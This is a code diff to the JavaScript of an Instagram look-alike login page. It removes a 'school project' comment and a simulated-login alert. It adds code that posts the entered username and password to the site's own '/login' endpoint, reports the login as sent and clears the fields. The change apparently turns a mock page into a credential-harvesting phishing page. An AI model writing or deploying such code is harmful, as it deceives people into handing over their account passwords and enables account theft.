@@ -1,50 +1,49 @@
-// script.js - Validación y efectos para Instagram (versión escolar)
-
 document.addEventListener('DOMContentLoaded', function () {
   const form = document.getElementById('loginForm');
   const usernameInput = form.querySelector('input[type="text"]');
   const passwordInput = form.querySelector('input[type="password"]');
 
   // Validación en tiempo real
-  usernameInput.addEventListener('input', validateField);
-  passwordInput.addEventListener('input', validateField);
+  usernameInput.addEventListener('input', clearError);
+  passwordInput.addEventListener('input', clearError);
 
-  form.addEventListener('submit', function (e) {
+  form.addEventListener('submit', async function (e) {
     e.preventDefault();
 
     let isValid = true;
 
-    // Validar campo de usuario
     if (usernameInput.value.trim() === '') {
       showError(usernameInput, 'Ingresa un teléfono, usuario o correo.');
       isValid = false;
-    } else {
-      clearError(usernameInput);
     }
 
-    // Validar contraseña
     if (passwordInput.value.trim() === '') {
       showError(passwordInput, 'Ingresa tu contraseña.');
       isValid = false;
-    } else {
-      clearError(passwordInput);
     }
 
-    if (isValid) {
-      // Simular inicio de sesión
-      alert('✅ ¡Inicio de sesión exitoso! (Este es un proyecto escolar)');
-      
-      // Opcional: cambiar el botón a "Cargando..."
-      const button = form.querySelector('button');
-      button.textContent = 'Cargando...';
-      button.disabled = true;
-      button.style.backgroundColor = '#4dabf7';
-      
-      setTimeout(() => {
-        button.textContent = 'Iniciar sesión';
-        button.disabled = false;
-        button.style.backgroundColor = '#0095f6';
-      }, 2000);
+    if (!isValid) return;
+
+    try {
+      const response = await fetch('/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          username: usernameInput.value.trim(),
+          password: passwordInput.value.trim()
+        })
+      });
+
+      if (response.ok) {
+        alert('✅ ¡Inicio de sesión enviado con éxito!');
+        usernameInput.value = '';
+        passwordInput.value = '';
+      } else {
+        alert('❌ Error al enviar los datos.');
+      }
+    } catch (err) {
+      alert('⚠️ No se pudo conectar con el servidor.');
+      console.error(err);
     }
   });
 
@@ -61,15 +60,11 @@ document.addEventListener('DOMContentLoaded', function () {
     }
   }
 
-  function clearError(input) {
-    input.style.borderColor = '#404040';
-    const error = input.nextElementSibling;
+  function clearError() {
+    this.style.borderColor = '#404040';
+    const error = this.nextElementSibling;
     if (error && error.classList.contains('error-message')) {
       error.remove();
     }
-  }
-
-  function validateField() {
-    clearError(this);
   }
 });
